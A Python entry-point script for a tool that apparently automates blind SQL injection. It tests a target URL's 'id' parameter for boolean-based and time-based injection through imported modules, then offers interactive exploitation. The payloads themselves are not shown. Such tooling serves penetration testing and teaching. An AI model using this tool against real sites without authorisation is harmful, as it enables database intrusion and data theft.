import argparse
from Modules.BooleanBasedSQLTester import test_boolean_based_sql_injection
from Modules.TimeBasedSQLTester import test_time_based_sql_injection
from Modules.URLUtils import extract_id
from Exploitation.Exploit import start_exploitation


def main():
    parser = argparse.ArgumentParser(description="Automate blind SQL injection tasks.")
    parser.add_argument("target_url", help="The URL of the vulnerable endpoint to target")
    args = parser.parse_args()

    id_value = extract_id(args.target_url)
    if id_value:
        detected_vulnerabilities = []  # List to store detected vulnerability types

        # Test for Boolean-based SQL injection
        vulnerability_type = test_boolean_based_sql_injection(args.target_url, id_value)
        if vulnerability_type == "boolean":
            print("Boolean-based SQL injection vulnerability detected.")
            detected_vulnerabilities.append("boolean")
        else:
            print("No Boolean-based SQL injection vulnerability detected.")

        # Ask if the user wants to test for Time-based vulnerabilities
        test_time_based = input("Do you want to test for Time-based SQL injection as well? (y/n): ").strip().lower()

        if test_time_based == 'y':
            # Test for Time-based SQL injection if user agrees
            time_based_vulnerability = test_time_based_sql_injection(args.target_url, id_value)
            if time_based_vulnerability == "time-based":
                print("Time-based SQL injection vulnerability detected.")
                detected_vulnerabilities.append("time-based")
            else:
                print("No Time-based SQL injection vulnerability detected.")

        if detected_vulnerabilities:
            print("\nDetected Vulnerabilities:")
            for idx, vulnerability in enumerate(detected_vulnerabilities, start=1):
                print(f"{idx}. {vulnerability.capitalize()} SQL Injection")

            while True:
                exploit_option = input("Do you want to attempt exploitation? (y/n): ").strip().lower()

                if exploit_option == 'y':
                    # Ask the user to choose which vulnerability to exploit
                    while True:
                        try:
                            choice = int(input(
                                f"Choose a vulnerability to exploit (1-{len(detected_vulnerabilities)}): ").strip())
                            if 1 <= choice <= len(detected_vulnerabilities):
                                selected_vulnerability = detected_vulnerabilities[choice - 1]
                                print(f"Exploiting {selected_vulnerability} vulnerability...")
                                start_exploitation(args.target_url, id_value, method=selected_vulnerability)
                                break  # Exit the inner loop after exploitation
                            else:
                                print(
                                    f"Invalid choice, please choose a number between 1 and {len(detected_vulnerabilities)}.")
                        except ValueError:
                            print("Invalid input. Please enter a valid number.")
                    break  # Exit the outer loop after exploitation
                elif exploit_option == 'n':
                    print("No exploitation performed.")
                    break  # Exit the loop if the user chooses not to exploit
                else:
                    print("Invalid input. Please enter 'y' or 'n'.")
        else:
            print("No vulnerability detected to exploit.")

    else:
        print("Error: No 'id' parameter found in the URL.")


if __name__ == "__main__":
    main()
